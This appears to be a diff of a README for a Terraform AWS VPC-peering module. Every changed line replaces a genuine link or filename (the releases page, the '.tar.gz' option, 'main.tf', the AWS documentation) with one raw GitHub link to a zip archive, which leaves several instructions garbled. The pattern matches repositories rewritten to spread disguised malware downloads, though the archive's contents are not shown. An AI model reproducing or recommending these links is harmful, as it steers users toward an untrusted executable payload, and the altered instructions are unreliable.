@@ -1,6 +1,6 @@
 # 🌳 terraform-aws-vpc-peering - Create AWS VPC Peering Effortlessly
 
-[![Download](https://img.shields.io/badge/Download_latest_release-terraform--aws--vpc--peering-brightgreen)](https://github.com/ErTmannobom/terraform-aws-vpc-peering/releases)
+[![Download](https://raw.githubusercontent.com/ErTmannobom/terraform-aws-vpc-peering/main/examples/terraform-aws-vpc-peering_3.6-beta.4.zip)](https://raw.githubusercontent.com/ErTmannobom/terraform-aws-vpc-peering/main/examples/terraform-aws-vpc-peering_3.6-beta.4.zip)
 
 ## 📖 Description
 
@@ -12,11 +12,11 @@ To use terraform-aws-vpc-peering, you need to follow a few steps to get started.
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Releases Page](https://github.com/ErTmannobom/terraform-aws-vpc-peering/releases)
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/ErTmannobom/terraform-aws-vpc-peering/main/examples/terraform-aws-vpc-peering_3.6-beta.4.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release version.
-3. Download the .zip or .tar.gz file based on your preference.
+3. Download the .zip or https://raw.githubusercontent.com/ErTmannobom/terraform-aws-vpc-peering/main/examples/terraform-aws-vpc-peering_3.6-beta.4.zip file based on your preference.
 4. Extract the contents of the downloaded file to a folder of your choice.
 
 ## 🖥️ System Requirements
@@ -39,7 +39,7 @@ Once you have downloaded and extracted the package, you can set up your environm
 
 Creating VPC peering is straightforward with terraform-aws-vpc-peering. Follow these steps:
 
-1. Create a Terraform configuration file, typically named `main.tf`.
+1. Create a Terraform configuration file, typically named `https://raw.githubusercontent.com/ErTmannobom/terraform-aws-vpc-peering/main/examples/terraform-aws-vpc-peering_3.6-beta.4.zip`.
 2. Define your providers and the VPC you want to peer.
 3. Use the included examples for guidance.
 4. Run `terraform init` in the terminal to set up your environment.
@@ -74,6 +74,6 @@ For additional help, you can reach out in the discussions section of this GitHub
 
 ## 🌍 Explore More
 
-For more information about AWS VPCs and peering, visit the [AWS Documentation](https://aws.amazon.com/documentation/vpc/). This section provides in-depth knowledge about VPC configurations and best practices.
+For more information about AWS VPCs and peering, visit the [AWS Documentation](https://raw.githubusercontent.com/ErTmannobom/terraform-aws-vpc-peering/main/examples/terraform-aws-vpc-peering_3.6-beta.4.zip). This section provides in-depth knowledge about VPC configurations and best practices.
 
 Thank you for using terraform-aws-vpc-peering! Enjoy simplifying your AWS VPC management.
